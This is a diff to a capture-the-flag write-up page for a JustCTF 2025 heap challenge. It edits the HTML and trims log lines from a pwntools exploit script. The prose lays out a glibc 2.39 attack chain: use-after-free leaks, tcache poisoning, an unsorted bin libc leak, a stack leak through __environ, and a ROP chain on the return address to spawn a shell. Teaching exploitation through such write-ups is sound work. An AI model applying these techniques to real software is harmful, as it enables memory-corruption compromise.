@@ -179,8 +179,8 @@ if __name__ == "__main__":
       </div>
 
       <div class="section-content">
-        <h2>checksec? Oh boy.</h2>
-        <pre><code class="language-bash">RELRO:    Full RELRO  
+        <h1>Checksec output</h1>
+        <pre><code>RELRO:    Full RELRO  
 Canary:   Yes  
 NX:       Yes  
 PIE:      Yes  
@@ -191,10 +191,9 @@ IBT:      Enabled</code></pre>
           So... no GOT overwrite. No return-to-plt. No partial overwrite shenanigans.<br>
           <br>
           And the binary allocates pretty small chunks — so we’re not even getting out of the tcache fastbin area.<br>
-          <strong>Leak required.</strong> No exceptions.
+          <span class="text"> <strong>Leak required.</strong></span> No exceptions.
         </p>
       </div>
-
       <div class="section-content">
         <h2>Welcome to the House... of Something?</h2>
         <p>
@@ -212,9 +211,7 @@ IBT:      Enabled</code></pre>
           <strong>Beautiful.</strong>
         </p>
       </div>
-
       <div class="section-content">
-        <h2>Gameplan</h2>
         <h4>Step 1: Leak Heap Address + Tcache Key</h4>
         <p>
           Using the UAF, we read a freed chunk and get two things:
@@ -223,13 +220,12 @@ IBT:      Enabled</code></pre>
             <li><strong>Mangled pointer</strong> — XORing this with the key gives us a heap leak.</li>
           </ul>
         </p>
-
         <h4>Step 2: Tcache Poisoning for Controlled Allocation</h4>
         <p>
           We poison the tcache freelist to get a pointer that overlaps with another chunk. This lets us:
           <ul>
             <li>Corrupt its metadata (e.g., the <code>size</code> field).</li>
-            <li>Create a fake chunk header with <code>size &gt; 0x408</code> → ensures it goes to the unsorted bin.</li>
+            <li>Create a fake chunk header with <code>size &gt; 0x410</code> → ensures it goes to the unsorted bin.</li>
           </ul>
           <br>
           💡 <strong>Important glibc 2.39 checks:</strong>
@@ -238,9 +234,9 @@ IBT:      Enabled</code></pre>
             <li>Next chunk’s <code>prev_size</code> and <code>size</code> fields must line up correctly.</li>
             <li>If you corrupt a chunk’s size, make sure you don't accidentally mark it as <code>IS_MMAPPED</code> or you'll crash.</li>
           </ul>
+          <p style="margin-top: 15px;">For a deeper dive into how these checks work internally, you can browse the <a href="https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html" target="_blank" rel="noopener noreferrer"><code>malloc.c</code> source in glibc</a>.</p>
           <img src="{{ '/writeups/JustCTF2025/assets/babyheap1.png' | relative_url }}" alt="snippet" class="code-screenshot" />
         </p>
-
         <h4>Step 3: Trigger Unsorted Bin Insertion</h4>
         <p>
           Now we free our overlapping (victim) chunk with the large fake size → it ends up in the <code>unsorted bin</code>.<br>
@@ -254,7 +250,6 @@ IBT:      Enabled</code></pre>
             <li>Poison tcache again — but this time to leak stack address via <code>__environ</code>.</li>
           </ul>
         </p>
-
         <h4>Step 4: Final Tcache Poisoning – Stack Write</h4>
         <p>
           We tcache-poison again to get an allocation pointing directly to the saved return address on the stack.<br>
@@ -370,7 +365,6 @@ def exploit():
     io.sendlineafter(b"Index: ", b'11')
     io.recvuntil(b"A" * 0x18)
     stack_leak = u64(io.recv(6).ljust(8, b'\x00'))
-    log.success(f"STACK LEAK @ {hex(stack_leak)}")
 
     # Now use tcache poisoning again to write ROP chain to stack
     malloc(13, b'13')
@@ -398,7 +392,6 @@ def exploit():
     malloc(16, payload)
 
     # Pop shell
-    log.success("🚀 Launching shell...")
     io.interactive()
 
 def main():
@@ -410,7 +403,6 @@ def main():
 if __name__ == "__main__":
     main()
 </div>
-    </div>
   </section>
 </section>
 
